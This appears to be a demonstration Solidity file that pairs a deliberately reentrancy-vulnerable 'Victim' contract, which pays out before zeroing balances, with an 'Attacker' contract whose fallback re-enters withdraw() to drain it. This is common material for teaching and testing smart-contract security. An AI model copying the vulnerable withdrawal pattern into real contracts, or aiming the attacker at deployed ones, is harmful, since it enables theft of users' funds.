pragma solidity ^0.4.18;

contract Victim { 
    mapping (address => uint) userbalances;
    
    event LogWithdraw(address withdrawer, uint amount);
    event LogDeposit(address sender, uint amount);

    function withdraw() payable{ 
        userbalances[msg.sender] += msg.value;   
        LogWithdraw(msg.sender,userbalances[msg.sender]);
        if (msg.sender.call.value(userbalances[msg.sender])()) {
            userbalances[msg.sender] = 0;
        }
    }

    function() payable{
        userbalances[msg.sender] += msg.value; 
        LogDeposit(msg.sender, msg.value);
    }
}

contract Attacker {
    Victim v;
    
    event LogWithdrawalAttack(uint gasvalue);

    function Attacker(address dest) {
        v = Victim(dest);
    }

    function attack() {
        v.transfer(msg.value);
        v.withdraw();
    } 
  
    function() payable{
        if (msg.gas > 100000) {
            LogWithdrawalAttack(msg.gas);
            v.withdraw();
        }
    }	
}
